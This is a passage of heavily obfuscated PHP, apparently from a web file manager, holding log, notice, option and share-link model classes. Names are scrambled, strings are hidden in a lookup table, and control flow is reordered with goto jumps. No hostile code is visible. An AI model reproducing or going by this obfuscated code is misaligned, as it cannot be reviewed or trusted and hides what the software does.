LNG($cÜÑ¼È„‘[2043]), $cÜÑ¼È„‘[1663] => LNG($cÜÑ¼È„‘[2044]), $cÜÑ¼È„‘[2045] => LNG($cÜÑ¼È„‘[2046]), $cÜÑ¼È„‘[1662] => LNG($cÜÑ¼È„‘[2047]), $cÜÑ¼È„‘[2048] => LNG($cÜÑ¼È„‘[2049]), $cÜÑ¼È„‘[2050] => LNG($cÜÑ¼È„‘[2051]), $cÜÑ¼È„‘[2052] => LNG($cÜÑ¼È„‘[2053]), $cÜÑ¼È„‘[2054] => LNG($cÜÑ¼È„‘[2054]), $cÜÑ¼È„‘[2055] => LNG($cÜÑ¼È„‘[1634]), $cÜÑ¼È„‘[2056] => LNG($cÜÑ¼È„‘[2057]), $cÜÑ¼È„‘[2058] => LNG($cÜÑ¼È„‘[2059]), $cÜÑ¼È„‘[2060] => LNG($cÜÑ¼È„‘[2061]), $cÜÑ¼È„‘[2062] => LNG($cÜÑ¼È„‘[2063]), $cÜÑ¼È„‘[2064] => LNG($cÜÑ¼È„‘[2065]), $cÜÑ¼È„‘[2066] => LNG($cÜÑ¼È„‘[2066]), $cÜÑ¼È„‘[2067] => LNG($cÜÑ¼È„‘[2068]), $cÜÑ¼È„‘[2069] => LNG($cÜÑ¼È„‘[2070]), $cÜÑ¼È„‘[2071] => LNG($cÜÑ¼È„‘[2072]), $cÜÑ¼È„‘[2073] => LNG($cÜÑ¼È„‘[2074]), $cÜÑ¼È„‘[2075] => LNG($cÜÑ¼È„‘[2076]), $cÜÑ¼È„‘[2077] => LNG($cÜÑ¼È„‘[2078])); } private function typeFile() { $A†·¥¾‹Ú† =& $_SERVER[£¶ä½¶¢]; $E‡ÙÊòĞÏì = array($A†·¥¾‹Ú†[1665] => array($A†·¥¾‹Ú†[1666]), $A†·¥¾‹Ú†[2020] => array($A†·¥¾‹Ú†[2079]), $A†·¥¾‹Ú†[2022] => array($A†·¥¾‹Ú†[2080]), $A†·¥¾‹Ú†[1658] => array($A†·¥¾‹Ú†[1659]), $A†·¥¾‹Ú†[2030] => array(), $A†·¥¾‹Ú†[2032] => array(), $A†·¥¾‹Ú†[2034] => array(), $A†·¥¾‹Ú†[1668] => array($A†·¥¾‹Ú†[1670]), $A†·¥¾‹Ú†[1669] => array($A†·¥¾‹Ú†[1670]), $A†·¥¾‹Ú†[2038] => array($A†·¥¾‹Ú†[2081]), $A†·¥¾‹Ú†[2040] => array($A†·¥¾‹Ú†[2081]), $A†·¥¾‹Ú†[2042] => array($A†·¥¾‹Ú†[2082]), $A†·¥¾‹Ú†[2028] => array($A†·¥¾‹Ú†[2083]), $A†·¥¾‹Ú†[1663] => array($A†·¥¾‹Ú†[2084]), $A†·¥¾‹Ú†[2045] => array($A†·¥¾‹Ú†[2085]), $A†·¥¾‹Ú†[1662] => array($A†·¥¾‹Ú†[1664])); return $E‡ÙÊòĞÏì; } private function typeAll() { goto EéùéìŠ„; D‡…ÕæÆÖ: return $a¸©÷ù§Ï†; goto aÏš—Í®àŒ; EéùéìŠ„: $bÃÍŸ²ÖãÜ =& $_SERVER[£¶ä½¶¢]; $a¸©÷ù§Ï† = $this->typeList; $F”ÔÑ­Ö© = array_filter($this->typeFile()); goto fÀÂ©œŠÃ; fÀÂ©œŠÃ: foreach ($F”ÔÑ­Ö© as $Bõ³ÅÙòŠ¹ => $FÇšÕ…ÂÙœ) { $a¸©÷ù§Ï†[$FÇšÕ…ÂÙœ[0]] = $a¸©÷ù§Ï†[$Bõ³ÅÙòŠ¹]; } $a¸©÷ù§Ï†[$bÃÍŸ²ÖãÜ[1670]] = LNG($bÃÍŸ²ÖãÜ[2086]); $a¸©÷ù§Ï†[$bÃÍŸ²ÖãÜ[2081]] = LNG($bÃÍŸ²ÖãÜ[2087]); goto D‡…ÕæÆÖ; aÏš—Í®àŒ: } public function addLog($F„İ»ÇÙ‘ , $aËí¬‚è·Ş = array()) { goto aÕˆ¨±»˜›; b¶ºˆŸÓ”Ê: $aËí¬‚è·Ş = array($Eì‚Ù¸ Õš[1517] => Session::sign(), $Eì‚Ù¸ Õš[1518] => $cËĞõ¼ä, $Eì‚Ù¸ Õš[39] => $F„İ»ÇÙ‘ , $Eì‚Ù¸ Õš[1520] => json_encode($aËí¬‚è·Ş)); parent::add($aËí¬‚è·Ş); goto fäµğ¼‹¦ã; aÕˆ¨±»˜›: $Eì‚Ù¸ Õš =& $_SERVER[£¶ä½¶¢]; if (!isset($this->typeList[$F„İ»ÇÙ‘ ])) { return; } $cËĞõ¼ä = defined($Eì‚Ù¸ Õš[462]) && USER_ID ? USER_ID : (isset($aËí¬‚è·Ş[$Eì‚Ù¸ Õš[1526]]) ? $aËí¬‚è·Ş[$Eì‚Ù¸ Õš[1526]] : 0); goto fëˆ»ªğ…­; fëˆ»ªğ…­: if (!$cËĞõ¼ä) { $cËĞõ¼ä = (int) Session::get($Eì‚Ù¸ Õš[1816]); } $bÕ¸¬¦ ô« = get_client_ip(); if (!$aËí¬‚è·Ş || strlen(json_encode($aËí¬‚è·Ş)) >= 1024) { $aËí¬‚è·Ş = array($Eì‚Ù¸ Õš[2088] => $bÕ¸¬¦ ô«); } else { if (is_array($aËí¬‚è·Ş)) { $aËí¬‚è·Ş[$Eì‚Ù¸ Õš[2088]] = $bÕ¸¬¦ ô«; } else { $aËí¬‚è·Ş = array($Eì‚Ù¸ Õš[1086] => $aËí¬‚è·Ş, $Eì‚Ù¸ Õš[2088] => $bÕ¸¬¦ ô«); } } goto b¶ºˆŸÓ”Ê; fäµğ¼‹¦ã: } public function remove($b‚…†£±ÂØ) { $this->where(array($_SERVER[£¶ä½¶¢][420] => $b‚…†£±ÂØ))->delete(); } private function _makeOrder($A–êŞ‚êË™ = '') { goto dÄ†ïÓƒ¬; E‘…öÔ—Ú¯: return $this->order($A–êŞ‚êË™); goto d‚Á‘‰ëëµ; B¯Œë¯º²: $BÕİ†ŸçÛÖ = Input::get($F‘ÖÖÍÓ‡¡[444], $F‘ÖÖÍÓ‡¡[17], $F‘ÖÖÍÓ‡¡[1848], array($F‘ÖÖÍÓ‡¡[1772], $F‘ÖÖÍÓ‡¡[438])); $BÕİ†ŸçÛÖ = $bÖŞï¤„¤Ø[$BÕİ†ŸçÛÖ]; $A–êŞ‚êË™ = $A–êŞ‚êË™ . "{$c‘‰ä‚ÜÛÆ}\x20{$BÕİ†ŸçÛÖ}"; goto E‘…öÔ—Ú¯; dÄ†ïÓƒ¬: $F‘ÖÖÍÓ‡¡ =& $_SERVER[£¶ä½¶¢]; $c‘‰ä‚ÜÛÆ = $F‘ÖÖÍÓ‡¡[204]; $bÖŞï¤„¤Ø = array($F‘ÖÖÍÓ‡¡[436] => $F‘ÖÖÍÓ‡¡[437], $F‘ÖÖÍÓ‡¡[438] => $F‘ÖÖÍÓ‡¡[439]); goto B¯Œë¯º²; d‚Á‘‰ëëµ: } public function get($bí‹˜â = '') { goto D‹ŞÀÏÍî; C¯¦Ë©ëœ: if (!empty($bí‹˜â[$aì£ˆÄÔœ [2088]])) { $B¶ÇİßÇ—[$aì£ˆÄÔœ [439]] = array($aì£ˆÄÔœ [388], "\x25{$bí‹˜â[$aì£ˆÄÔœ [2088]]}\45"); } $D˜÷ßñì…Ø = $this->_makeOrder()->where($B¶ÇİßÇ—)->selectPage(); if (empty($D˜÷ßñì…Ø[$aì£ˆÄÔœ [376]])) { show_json(array(), !0, $D˜÷ßñì…Ø[$aì£ˆÄÔœ [373]]); } goto bĞæ ¾ãæ; a´¶åÆˆÇË: if ($bí‹˜â[$aì£ˆÄÔœ [1526]]) { $B¶ÇİßÇ—[$aì£ˆÄÔœ [1526]] = $bí‹˜â[$aì£ˆÄÔœ [1526]]; } if (isset($bí‹˜â[$aì£ˆÄÔœ [729]])) { $CÅ¬Œíªß = $bí‹˜â[$aì£ˆÄÔœ [729]]; $aòá¯»Ñ¾ë = isset($bí‹˜â[$aì£ˆÄÔœ [484]]) ? $bí‹˜â[$aì£ˆÄÔœ [484]] : time(); $B¶ÇİßÇ—[$aì£ˆÄÔœ [204]] = array($aì£ˆÄÔœ [340], array($CÅ¬Œíªß, $aòá¯»Ñ¾ë)); } if ($bí‹˜â[$aì£ˆÄÔœ [39]]) { $c¯ÇÄÍ¨·„ = explode($aì£ˆÄÔœ [57], $bí‹˜â[$aì£ˆÄÔœ [39]]); $C¯®Œôâ« = $this->typeFile(); $fçïœ‹œŠğ = array(); foreach ($c¯ÇÄÍ¨·„ as $Fæ‡ÁÚì) { $fçïœ‹œŠğ[] = $Fæ‡ÁÚì; if (isset($C¯®Œôâ«[$Fæ‡ÁÚì])) { $fçïœ‹œŠğ = array_merge($fçïœ‹œŠğ, $C¯®Œôâ«[$Fæ‡ÁÚì]); } } $fçïœ‹œŠğ = array_unique($fçïœ‹œŠğ); if ($fçïœ‹œŠğ) { $B¶ÇİßÇ—[$aì£ˆÄÔœ [39]] = array($aì£ˆÄÔœ [17], $fçïœ‹œŠğ); } } else { $B¶ÇİßÇ—[$aì£ˆÄÔœ [39]] = array($aì£ˆÄÔœ [2089], $aì£ˆÄÔœ [2090]); } goto C¯¦Ë©ëœ; bĞæ ¾ãæ: $D˜÷ßñì…Ø[$aì£ˆÄÔœ [376]] = $this->logList($D˜÷ßñì…Ø[$aì£ˆÄÔœ [376]]); return $D˜÷ßñì…Ø; goto fé¶±Úß’; D‹ŞÀÏÍî: $aì£ˆÄÔœ  =& $_SERVER[£¶ä½¶¢]; if (!$bí‹˜â) { show_json(array()); } $B¶ÇİßÇ— = array(); goto a´¶åÆˆÇË; fé¶±Úß’: } private function ipAddress(&$A„© ¤Éƒ¾) { $BêÕ„êæê =& $_SERVER[£¶ä½¶¢]; if (!empty($A„© ¤Éƒ¾[$BêÕ„êæê[2088]])) { $C«Š­—¨«ô = IpLocation::get($A„© ¤Éƒ¾[$BêÕ„êæê[2088]]); } else { $C«Š­—¨«ô = LNG($BêÕ„êæê[2091]); } $A„© ¤Éƒ¾[$BêÕ„êæê[2092]] = $C«Š­—¨«ô; } private function descZipDownload($dõªµØÅ‰Š, &$Aõ™áà÷ª ) { $d—ôó‰È›– =& $_SERVER[£¶ä½¶¢]; if (!isset($dõªµØÅ‰Š[$d—ôó‰È›–[2093]])) { return; } $dÓˆ…£Ë‚ = json_decode($dõªµØÅ‰Š[$d—ôó‰È›–[2093]], !0); foreach ($dÓˆ…£Ë‚ as $E†èÙÙ‹°À) { try { $Eç©£µ“«ò = IO::infoFull($E†èÙÙ‹°À[$d—ôó‰È›–[86]]); } catch (Exception $f†ÏÅ›ïÏœ) { continue; } $dõªµØÅ‰Š[$d—ôó‰È›–[86]] = $E†èÙÙ‹°À[$d—ôó‰È›–[86]]; $Aõ™áà÷ª [] = $dõªµØÅ‰Š[$d—ôó‰È›–[403]] = $Eç©£µ“«ò[$d—ôó‰È›–[403]]; $Aõ™áà÷ª [] = $dõªµØÅ‰Š[$d—ôó‰È›–[1904]] = $Eç©£µ“«ò[$d—ôó‰È›–[486]]; break; } return $dõªµØÅ‰Š; } private function getSourceList(&$AÚŒÂÄ…©æ) { $DÙÛ×Ä®¥ =& $_SERVER[£¶ä½¶¢]; $Dï¥ÂÉ„‡ê = array(); foreach ($AÚŒÂÄ…©æ as $aÌ‹Ì­À => $aßÖŞÂÛé¿) { goto bè¡§ Û°‡; eæ‡“ïÃÛ³: $Dï¥ÂÉ„‡ê[] = $FÂçÏ½©õÌ[$DÙÛ×Ä®¥[403]]; $Dï¥ÂÉ„‡ê[] = $FÂçÏ½©õÌ[$DÙÛ×Ä®¥[1904]]; if ($FÂçÏ½©õÌ[$DÙÛ×Ä®¥[39]] == $DÙÛ×Ä®¥[528]) { $Dï¥ÂÉ„‡ê[] = $FÂçÏ½©õÌ[$DÙÛ×Ä®¥[439]][$DÙÛ×Ä®¥[1053]]; $Dï¥ÂÉ„‡ê[] = $FÂçÏ½©õÌ[$DÙÛ×Ä®¥[439]][$DÙÛ×Ä®¥[1054]]; } goto eˆ…‘î¬«; bè¡§ Û°‡: $FÂçÏ½©õÌ = json_decode($aßÖŞÂÛé¿[$DÙÛ×Ä®¥[439]], !0); if ($aßÖŞÂÛé¿[$DÙÛ×Ä®¥[39]] == $DÙÛ×Ä®¥[1661]) { $FÂçÏ½©õÌ = $this->descZipDownload($FÂçÏ½©õÌ, $Dï¥ÂÉ„‡ê); $AÚŒÂÄ…©æ[$aÌ‹Ì­À][$DÙÛ×Ä®¥[439]] = json_encode($FÂçÏ½©õÌ); continue; } if (strpos($aßÖŞÂÛé¿[$DÙÛ×Ä®¥[39]], $DÙÛ×Ä®¥[1905]) !== 0) { if (!isset($FÂçÏ½©õÌ[$DÙÛ×Ä®¥[86]]) || strpos($aßÖŞÂÛé¿[$DÙÛ×Ä®¥[39]], $DÙÛ×Ä®¥[2094]) !== 0) { continue; } try { $a²¹ÚÒ¢ê = IO::infoFull($FÂçÏ½©õÌ[$DÙÛ×Ä®¥[86]]); } catch (Exception $aˆ÷çÄåµÔ) { continue; } $Dï¥ÂÉ„‡ê[] = $FÂçÏ½©õÌ[$DÙÛ×Ä®¥[403]] = $a²¹ÚÒ¢ê[$DÙÛ×Ä®¥[403]]; $Dï¥ÂÉ„‡ê[] = $FÂçÏ½©õÌ[$DÙÛ×Ä®¥[1904]] = $a²¹ÚÒ¢ê[$DÙÛ×Ä®¥[486]]; $AÚŒÂÄ…©æ[$aÌ‹Ì­À][$DÙÛ×Ä®¥[439]] = json_encode($FÂçÏ½©õÌ); continue; } goto eæ‡“ïÃÛ³; eˆ…‘î¬«: if ($FÂçÏ½©õÌ[$DÙÛ×Ä®¥[39]] == $DÙÛ×Ä®¥[1912]) { $Dï¥ÂÉ„‡ê[] = $FÂçÏ½©õÌ[$DÙÛ×Ä®¥[439]][$DÙÛ×Ä®¥[403]]; } goto Eßš‚‰ õï; Eßš‚‰ õï: } if (!$Dï¥ÂÉ„‡ê) { return array(); } return Model($DÙÛ×Ä®¥[798])->sourceListInfo($Dï¥ÂÉ„‡ê, !0); } private function logList($bÎï …·æ) { goto eê•‰Ì‘ƒ„; cğÜŠõ«™ñ: $FåÕÜ¼æ¥• = array(); foreach ($bÎï …·æ as $B±Ûåâ×¦â => $DñİÚ“ä¢Ì) { goto E¬÷Ã©œÁó; b´Ñ¢ëÆº: unset($DñİÚ“ä¢Ì[$d—Û×°Áá¯[2097]]); $dÃŸÇ‘ìĞ±[] = $DñİÚ“ä¢Ì; goto eªŠ¬½§Øº; B™°˜×÷¡…: $this->ipAddress($DñİÚ“ä¢Ì); if (strpos($CÀàïœÉœ‹, $d—Û×°Áá¯[1905]) === 0 || isset($c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[1904]])) { goto eá²ËŒã‡; E÷°Ö½İğ: if ($c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[1917]] && $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[1917]][$d—Û×°Áá¯[412]] == $d—Û×°Áá¯[1168]) { $FåÕÜ¼æ¥•[] = $DñİÚ“ä¢Ì[$d—Û×°Áá¯[401]]; unset($bÎï …·æ[$B±Ûåâ×¦â]); continue; } goto AÁ‘¢£„òó; E¬®³×‘ã¦: if ($c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[39]] == $d—Û×°Áá¯[1912]) { $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[439]][$d—Û×°Áá¯[403]] = $bí„áÍ¹º[$c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[439]][$d—Û×°Áá¯[403]]]; } if ($c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[39]] == $d—Û×°Áá¯[1656]) { $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[1917]] = $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[95]]; $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[1904]] = $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[1917]][$d—Û×°Áá¯[403]]; $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[95]] = !1; $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[403]] = $d—Û×°Áá¯[43]; } if ($c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[95]] && $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[95]][$d—Û×°Áá¯[412]] == $d—Û×°Áá¯[1168]) { $FåÕÜ¼æ¥•[] = $DñİÚ“ä¢Ì[$d—Û×°Áá¯[401]]; unset($bÎï …·æ[$B±Ûåâ×¦â]); continue; } goto E÷°Ö½İğ; eá²ËŒã‡: $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[95]] = $bí„áÍ¹º[$c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[403]]]; $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[1917]] = $bí„áÍ¹º[$c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[1904]]]; if ($c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[39]] == $d—Û×°Áá¯[528]) { $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[439]][$d—Û×°Áá¯[1053]] = $bí„áÍ¹º[$c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[439]][$d—Û×°Áá¯[1053]]]; $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[439]][$d—Û×°Áá¯[1054]] = $bí„áÍ¹º[$c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[439]][$d—Û×°Áá¯[1054]]]; } goto E¬®³×‘ã¦; AÁ‘¢£„òó: } $DñİÚ“ä¢Ì[$d—Û×°Áá¯[439]] = $c›ÖÁŠ÷¬Ë; goto b´Ñ¢ëÆº; E¬÷Ã©œÁó: $CÀàïœÉœ‹ = $DñİÚ“ä¢Ì[$d—Û×°Áá¯[39]]; $EêñËŞ£‘Œ = isset($e›”ëø¦‹[$DñİÚ“ä¢Ì[$d—Û×°Áá¯[1526]]]) ? $e›”ëø¦‹[$DñİÚ“ä¢Ì[$d—Û×°Áá¯[1526]]] : !1; $B•‹‹ ‡ = strpos($CÀàïœÉœ‹, $d—Û×°Áá¯[2095]) === 0 ? LNG($d—Û×°Áá¯[2096]) : LNG($d—Û×°Áá¯[2091]); goto a£ìÔİŠ†Ş; a£ìÔİŠ†Ş: $DñİÚ“ä¢Ì[$d—Û×°Áá¯[38]] = isset($EêñËŞ£‘Œ[$d—Û×°Áá¯[38]]) ? $EêñËŞ£‘Œ[$d—Û×°Áá¯[38]] : LNG($d—Û×°Áá¯[2091]); $DñİÚ“ä¢Ì[$d—Û×°Áá¯[1954]] = isset($EêñËŞ£‘Œ[$d—Û×°Áá¯[1954]]) ? $EêñËŞ£‘Œ[$d—Û×°Áá¯[1954]] : $d—Û×°Áá¯[43]; $DñİÚ“ä¢Ì[$d—Û×°Áá¯[1432]] = isset($fÀ‡„ßôí°[$CÀàïœÉœ‹]) ? $fÀ‡„ßôí°[$CÀàïœÉœ‹] : $B•‹‹ ‡; goto fáíŸ³íŒè; fáíŸ³íŒè: $DñİÚ“ä¢Ì[$d—Û×°Áá¯[1847]] = $EêñËŞ£‘Œ; $c›ÖÁŠ÷¬Ë = json_decode($DñİÚ“ä¢Ì[$d—Û×°Áá¯[439]], !0); $DñİÚ“ä¢Ì[$d—Û×°Áá¯[2088]] = isset($c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[2088]]) ? $c›ÖÁŠ÷¬Ë[$d—Û×°Áá¯[2088]] : $d—Û×°Áá¯[43]; goto B™°˜×÷¡…; eªŠ¬½§Øº: } $this->clearSystemPathLog($FåÕÜ¼æ¥•); goto EØ–Ô¦İ¬; EØ–Ô¦İ¬: return $dÃŸÇ‘ìĞ±; goto E¯ò´¿Ï†—; cÌÌãˆéëÜ: $bí„áÍ¹º = $this->getSourceList($bÎï …·æ); $fÀ‡„ßôí° = $this->typeAll(); $dÃŸÇ‘ìĞ± = array(); goto cğÜŠõ«™ñ; eê•‰Ì‘ƒ„: $d—Û×°Áá¯ =& $_SERVER[£¶ä½¶¢]; $a™œ—«¥ñ× = array_to_keyvalue($bÎï …·æ, $d—Û×°Áá¯[43], $d—Û×°Áá¯[1526]); $e›”ëø¦‹ = Model($d—Û×°Áá¯[514])->userListInfo(array_unique($a™œ—«¥ñ×)); goto cÌÌãˆéëÜ; E¯ò´¿Ï†—: } private function clearSystemPathLog($AÌ×áÏßïÍ) { $cˆöæ¡´àë =& $_SERVER[£¶ä½¶¢]; if (count($AÌ×áÏßïÍ) == 0) { return; } $fÎí«®‹ê = array($cˆöæ¡´àë[401] => array($cˆöæ¡´àë[17], array_unique($AÌ×áÏßïÍ))); $this->where($fÎí«®‹ê)->delete(); } public function deviceList($e†İè­òõ, $fçºĞÍ¾¨˜ = 0) { $eĞÆìğ¬Î‡ =& $_SERVER[£¶ä½¶¢]; $Eµ¯·ê¶‹ = array($eĞÆìğ¬Î‡[1526] => $e†İè­òõ, $eĞÆìğ¬Î‡[204] => array($eĞÆìğ¬Î‡[969], $fçºĞÍ¾¨˜), $eĞÆìğ¬Î‡[39] => $eĞÆìğ¬Î‡[1630]); $B¿¸ÔÆî‰· = array(); $D½½¢ÛÆÃÃ = $this->field($eĞÆìğ¬Î‡[2098])->where($Eµ¯·ê¶‹)->order($eĞÆìğ¬Î‡[1915])->limit(50)->select(); foreach ($D½½¢ÛÆÃÃ as $cÜ®ßóèƒœ => $Eçø’ŒØœó) { goto b‘æ„ÔˆèÈ; aˆéù»— ¬: unset($D»¿×è‡íÒ[$eĞÆìğ¬Î‡[2088]]); $dÔ¨ºß­· = $this->deviceType($D»¿×è‡íÒ[$eĞÆìğ¬Î‡[1906]]); if (isset($B¿¸ÔÆî‰·[$dÔ¨ºß­·])) { continue; } goto f¶¤èšã¸; b‘æ„ÔˆèÈ: if ($cÜ®ßóèƒœ > 0 && abs($Eçø’ŒØœó[$eĞÆìğ¬Î‡[204]] - $D½½¢ÛÆÃÃ[$cÜ®ßóèƒœ - 1][$eĞÆìğ¬Î‡[204]]) < 5) { continue; } $D»¿×è‡íÒ = json_decode($Eçø’ŒØœó[$eĞÆìğ¬Î‡[439]], !0); $Eçø’ŒØœó[$eĞÆìğ¬Î‡[2088]] = isset($D»¿×è‡íÒ[$eĞÆìğ¬Î‡[2088]]) ? $D»¿×è‡íÒ[$eĞÆìğ¬Î‡[2088]] : $eĞÆìğ¬Î‡[43]; goto aˆéù»— ¬; f¶¤èšã¸: $this->ipAddress($Eçø’ŒØœó); $Eçø’ŒØœó[$eĞÆìğ¬Î‡[439]] = $D»¿×è‡íÒ; $B¿¸ÔÆî‰·[$dÔ¨ºß­·] = $Eçø’ŒØœó; goto EƒëÊå‹àù; EƒëÊå‹àù: } return array_values($B¿¸ÔÆî‰·); } public function deviceType($a¤ê§»·‡“) { return $a¤ê§»·‡“; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\x6e\x6f\164\x69\143\145\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\143\x6f\156\x74\145\156\x74", "\x61\x75\x74\x68", "\155\x6f\144\x65", "\164\x69\155\145", "\164\171\160\145", "\154\x65\166\145\x6c", "\x65\x6e\x61\x62\154\145", "\163\157\x72\164"); public function listData($d¾êÔ³ƒ§ª = false, $F¦™‡êÕ¨„ = "\163\157\162\x74", $dËñÔÁß®« = false) { return parent::listData($d¾êÔ³ƒ§ª, $F¦™‡êÕ¨„, $dËñÔÁß®«); } public function add($b­È‰·‹ì¥) { $AÑØß¢ŸŠ =& $_SERVER[£¶ä½¶¢]; $fÁÚÄºâ² = time(); if ($b­È‰·‹ì¥[$AÑØß¢ŸŠ[22]] == $AÑØß¢ŸŠ[2099]) { $fÁÚÄºâ² = strtotime($b­È‰·‹ì¥[$AÑØß¢ŸŠ[207]]); } $b­È‰·‹ì¥[$AÑØß¢ŸŠ[207]] = $fÁÚÄºâ²; return parent::insert($b­È‰·‹ì¥); } public function update($AÍÒÖÚÆñ, $cŞ÷„„¾) { goto dßÛƒ¢¤…; A«Ùê®øÆ: return parent::update($AÍÒÖÚÆñ, $cŞ÷„„¾); goto fºƒ„‡ê§Ã; BÇöŞ„®¿Å: $eÂÏå‡­« = time(); if ($cŞ÷„„¾[$EŸµÚøĞº[22]] == $EŸµÚøĞº[2099]) { $eÂÏå‡­« = strtotime($cŞ÷„„¾[$EŸµÚøĞº[207]]); } $cŞ÷„„¾[$EŸµÚøĞº[207]] = $eÂÏå‡­«; goto A«Ùê®øÆ; dßÛƒ¢¤…: $EŸµÚøĞº =& $_SERVER[£¶ä½¶¢]; $Dù½¬¹İ = $this->listData($AÍÒÖÚÆñ); if (!$Dù½¬¹İ) { return !1; } goto BÇöŞ„®¿Å; fºƒ„‡ê§Ã: } public function remove($bÆÇãÑÖö„) { $bø èõ‡‹Œ = $this->listData($bÆÇãÑÖö„); if (!$bø èõ‡‹Œ || $bø èõ‡‹Œ[$_SERVER[£¶ä½¶¢][1168]]) { return !1; } return parent::remove($bÆÇãÑÖö„); } public function sort($EĞØìî”ÏÜ, $D–°‰½—¡) { return parent::update($EĞØìî”ÏÜ, $D–°‰½—¡); } public function enable($B™ôéì®Ù‰, $c·ƒˆÙ‘Á‰) { return parent::update($B™ôéì®Ù‰, array($_SERVER[£¶ä½¶¢][2100] => $c·ƒˆÙ‘Á‰)); } private function initUserOption() { $a„Ò¼æÈê =& $_SERVER[£¶ä½¶¢]; $this->optionType = $a„Ò¼æÈê[2101]; $this->modelType = $a„Ò¼æÈê[2102]; $this->field = array($a„Ò¼æÈê[2103], $a„Ò¼æÈê[38], $a„Ò¼æÈê[207], $a„Ò¼æÈê[39], $a„Ò¼æÈê[2104], $a„Ò¼æÈê[718], $a„Ò¼æÈê[199]); } public function userNoticeGet($dƒ†ç±Ë¸‰ = false) { $this->initUserOption(); return parent::listData($dƒ†ç±Ë¸‰, $_SERVER[£¶ä½¶¢][401], !0); } public function userNoticeAdd($eÄÄË‰õ›ã) { $Eë¯ôéİĞ¿ =& $_SERVER[£¶ä½¶¢]; $this->initUserOption(); $fÇ ¦ÑšŸ’ = $this->findByKey($Eë¯ôéİĞ¿[2103], $eÄÄË‰õ›ã[$Eë¯ôéİĞ¿[401]]); if ($fÇ ¦ÑšŸ’) { return !0; } $D–Š¤Ò¦î¹ = array($Eë¯ôéİĞ¿[2103] => $eÄÄË‰õ›ã[$Eë¯ôéİĞ¿[401]], $Eë¯ôéİĞ¿[38] => $eÄÄË‰õ›ã[$Eë¯ôéİĞ¿[38]], $Eë¯ôéİĞ¿[207] => $eÄÄË‰õ›ã[$Eë¯ôéİĞ¿[207]], $Eë¯ôéİĞ¿[39] => isset($eÄÄË‰õ›ã[$Eë¯ôéİĞ¿[39]]) ? $eÄÄË‰õ›ã[$Eë¯ôéİĞ¿[39]] : 1, $Eë¯ôéİĞ¿[2104] => isset($eÄÄË‰õ›ã[$Eë¯ôéİĞ¿[2104]]) ? $eÄÄË‰õ›ã[$Eë¯ôéİĞ¿[2104]] : 0, $Eë¯ôéİĞ¿[718] => 0, $Eë¯ôéİĞ¿[199] => 0); return parent::insert($D–Š¤Ò¦î¹); } public function userNoticeEdit($A†Õô˜ªÙË, $aãŸîì¡…ğ) { $this->initUserOption(); return parent::update($A†Õô˜ªÙË, $aãŸîì¡…ğ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\164\145\x6d\x5f\x6f\160\164\151\x6f\x6e"; protected $jsonField = array("\x6d\x65\156\x75", "\x72\x6f\154\145", "\x72\157\154\145\107\x72\157\165\160", "\x72\x65\147\x69\163\164", "\145\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($eîª‘²”—®) { return "\x53\x79\163\164\x65\155\x4f\x70\164\151\157\x6e\x5f{$eîª‘²”—®}"; } protected function optionDefault($AªÈùÜŸ– = '') { $cº™¢‡ò =& $_SERVER[£¶ä½¶¢]; if ($AªÈùÜŸ– == $cº™¢‡ò[43]) { return $GLOBALS[$cº™¢‡ò[16]][$cº™¢‡ò[386]]; } } } goto bÒ©ÑáëîÅ; F²‘Âòì˜’: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Eêß´æ¶›) { $this->pathParse = $Eêß´æ¶›; } protected function infoParse($cÁÂ£»ÏÙ², $eˆğÇ†Æ² = false) { $c¹éÄ‚õˆá =& $_SERVER[£¶ä½¶¢]; return Action($c¹éÄ‚õˆá[1068])->sharePathInfo($this->pathParse[$c¹éÄ‚õˆá[86]], !0, $eˆğÇ†Æ²); } public function listPath($D¾İà”îÇÂ, $e×Öõ¯±« = false) { $cß¦™òÉø =& $_SERVER[£¶ä½¶¢]; $BªŞØ•Ùà‹ = IO::listPath($D¾İà”îÇÂ, $e×Öõ¯±«); foreach ($BªŞØ•Ùà‹ as $dØÓÀˆÏ‚¼ => $aäØ…Ê¼ß) { if (!in_array($dØÓÀˆÏ‚¼, array($cß¦™òÉø[84], $cß¦™òÉø[85]))) { continue; } foreach ($aäØ…Ê¼ß as $CÊÛˆÉµ³ => $BÅ¶æ³ê»Ï) { $BÅ¶æ³ê»Ï = Action($cß¦™òÉø[1220])->parsePathChildren($BÅ¶æ³ê»Ï, array($cß¦™òÉø[422] => $D¾İà”îÇÂ)); $BªŞØ•Ùà‹[$dØÓÀˆÏ‚¼][$CÊÛˆÉµ³] = Action($cß¦™òÉø[1068])->shareItemInfo($BÅ¶æ³ê»Ï); } } return $BªŞØ•Ùà‹; } public function listAll($bİàº±æ‡Œ) { $A‰ì‘ï‡¹ª =& $_SERVER[£¶ä½¶¢]; $D¸ÚŠĞ½–¨ = IO::listAll($bİàº±æ‡Œ); foreach ($D¸ÚŠĞ½–¨ as &$fŒæ”¨º«®) { 